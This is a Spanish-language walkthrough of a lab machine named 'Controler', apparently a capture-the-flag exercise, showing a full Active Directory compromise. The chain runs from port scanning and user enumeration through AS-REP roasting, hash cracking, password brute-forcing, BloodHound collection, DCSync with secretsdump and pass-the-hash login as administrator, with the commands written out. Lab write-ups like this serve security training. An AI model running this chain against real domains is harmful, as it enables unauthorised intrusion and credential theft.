---
description: '🔍 Dificultad: Media'
---

# Controler

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.50
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1655).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.50
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-21 162504.png" alt=""><figcaption></figcaption></figure>

Durante el escaneo, se identificaron múltiples puertos abiertos relacionados con **servicios típicos de Active Directory en un entorno Windows Server**. A continuación, se detalla cada uno:

| Puerto          | Servicio                 | Descripción                                                                   | Relevancia en Pentesting                                                        |
| --------------- | ------------------------ | ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **53**          | DNS (Simple DNS Plus)    | Servicio de resolución de nombres. Fundamental para la operación del dominio. | Enumeración de zonas, DNS spoofing, análisis de transferencias (`dig axfr`).    |
| **88**          | Kerberos                 | Protocolo de autenticación utilizado por AD.                                  | Objetivo de ataques como Kerberoasting, Pass-the-Ticket, Golden Ticket.         |
| **135**         | MS RPC                   | Microsoft RPC endpoint mapper.                                                | Comunicación entre servicios. Puede facilitar enumeración vía `rpcclient`.      |
| **139**         | NetBIOS-SSN              | Servicio para compartir archivos e impresoras (NetBIOS).                      | Usado con `smbclient`, `enum4linux-ng`, `smbmap`.                               |
| **389**         | LDAP                     | Protocolo para acceder al directorio (modo sin cifrar).                       | Enumeración de usuarios, grupos, SPNs, flags UAC. Clave en enumeración AD.      |
| **445**         | SMB (Microsoft-DS)       | Compartición de archivos en Windows.                                          | Dump de hashes, movimiento lateral (SMBexec, Psexec), enumeración sin creds.    |
| **464**         | kpasswd5                 | Servicio para cambio de contraseñas vía Kerberos.                             | Interesante para ataques como _krbrelayx_ o abuso de cuentas.                   |
| **593**         | RPC over HTTP            | Comunicación RPC encapsulada en HTTP.                                         | Utilizado por Exchange, Outlook y otras apps. A veces base de ataques internos. |
| **636**         | LDAPS (tcpwrapped)       | LDAP sobre SSL/TLS.                                                           | Enumeración segura del directorio, aunque a menudo filtrado o cifrado.          |
| **3268**        | Global Catalog (LDAP)    | Puerto usado para consultas a todo el bosque AD.                              | Ideal para enumerar objetos de todo el dominio.                                 |
| **3269**        | GC over SSL (tcpwrapped) | Versión segura del Global Catalog.                                            | Misma funcionalidad que el 3268, pero cifrado.                                  |
| **5985**        | WinRM (HTTP)             | Windows Remote Management.                                                    | Punto de entrada para `evil-winrm`. Fundamental para ejecución remota.          |
| **9389**        | .NET Message Framing     | Servicio para autenticación de AD Web Services (ADWS).                        | Utilizado por PowerShell Remoting, BloodHound, etc.                             |
| **47001**       | HTTPAPI                  | Servicio adicional HTTP, generalmente WinRM.                                  | Usado por PowerShell Remoting.                                                  |
| **49664–49712** | MS RPC dinámicos         | Puertos de comunicación RPC asignados dinámicamente.                          | Relevantes para movimiento lateral, enumeración y abuso de servicios remotos.   |

### 🔎 **EXPLORACIÓN**

Tras el escaneo, hacemos una enumeración **SMB**.

```
nxc smb 192.168.1.50
```

<figure><img src="../../.gitbook/assets/image (1662).png" alt=""><figcaption></figcaption></figure>

Tenemos un dominio que añadimos al fichero `/etc/hosts`. Miramos los recursos compartidos.

```
nxc smb 192.168.1.50 --shares -u '' -p ''
```

<figure><img src="../../.gitbook/assets/image (1663).png" alt=""><figcaption></figcaption></figure>

```
smbmap --no-banner -H 192.168.1.50 -u '' -p ''
```

<figure><img src="../../.gitbook/assets/image (1664).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Tras no encontrar nada, intentamos sacar usuarios a través del dominio.

```
./kerbrute userenum -d control.nyx --dc 192.168.1.50 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
nxc smb 192.168.1.50 -u 'administrator' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

Encontramos al usuario Administrator pero los tiros no van por ahí. Entonces pensé que hay diccionarios especiales para enumerar entornos empresariales por lo que tiene sentido realizar fuerza bruta con esos.

{% @github-files/github-code-block url="https://github.com/attackdebris/kerberos_enum_userlists/" %}

<figure><img src="../../.gitbook/assets/image (1665).png" alt=""><figcaption></figcaption></figure>

Al verificar la cuenta del usuario válido **b.lewis** a nivel de dominio, se confirma que tiene configurado el atributo **UF\_DONT\_REQUIRE\_PREAUTH**. Esto permite obtener con éxito su **Ticket Granting Ticket (TGT)** sin necesidad de preautenticación.

<figure><img src="../../.gitbook/assets/image (1666).png" alt=""><figcaption></figcaption></figure>

Crackeamos el hash resultante.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

<figure><img src="../../.gitbook/assets/image (1667).png" alt=""><figcaption></figcaption></figure>

Validamos las credenciales.

```
netexec smb 192.168.1.50 -u 'b.lewis' -p '101Music'
```

<figure><img src="../../.gitbook/assets/image (1668).png" alt=""><figcaption></figcaption></figure>

Miramos si podemos conectarnos.

```
netexec winrm 192.168.1.50 -u 'b.lewis' -p '101Music'
```

<figure><img src="../../.gitbook/assets/image (1669).png" alt=""><figcaption></figcaption></figure>

No tenemos acceso. Hay que seguir enumerando más usuarios.

```
netexec smb 192.168.1.50 -u 'B.LEWIS' -p '101Music' --users
```

<figure><img src="../../.gitbook/assets/image (1670).png" alt=""><figcaption></figcaption></figure>

Tenemos a mayores un usuario con el acceso habilitado por lo que hacemos fuerza bruta con él.

```
netexec smb 192.168.1.50 -u 'j.levy' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

<figure><img src="../../.gitbook/assets/image (1671).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Validamos las credenciales de este usuario y ya de paso miramos si tenemos acceso.

```
evil-winrm -i 192.168.1.50 -u 'j.levy' -p 'Password1'
```

<figure><img src="../../.gitbook/assets/image (1672).png" alt=""><figcaption></figcaption></figure>

Vamos a hacer una recolección de los datos.

```
bloodhound-python -ns 192.168.1.50 -dc control.nyx -u 'b.lewis' -p '101Music' -d control.nyx -c all --zip
```

<figure><img src="../../.gitbook/assets/image (1673).png" alt=""><figcaption></figcaption></figure>

El usuario **j.levy@control.nyx** posee el privilegio **AllExtendedRights**, que incluye los permisos de replicación DS-Replication-Get-Changes y -Get-Changes-All; eso lo convierte, a efectos prácticos, en un “mini controlador de dominio” capaz de lanzar un **DCSync** con `secretsdump.py` y extraer todos los hashes del directorio—una puerta abierta a comprometer por completo la seguridad del dominio.

```
impacket-secretsdump control.nyx/j.levy:'Password1'@192.168.1.50 -just-dc-user administrator
```

<figure><img src="../../.gitbook/assets/image (1674).png" alt=""><figcaption></figcaption></figure>

Como obtenemos el hash del usuario administrator ya nos podemos conectar.

```
evil-winrm -i 192.168.1.50 -u 'administrator' -H '48b20d4f3ea31b7234c92b71c90fbff7'
```

<figure><img src="../../.gitbook/assets/image (1675).png" alt=""><figcaption></figcaption></figure>

Ya podemos conseguir las **flags**.

<figure><img src="../../.gitbook/assets/image (1676).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1677).png" alt=""><figcaption></figcaption></figure>
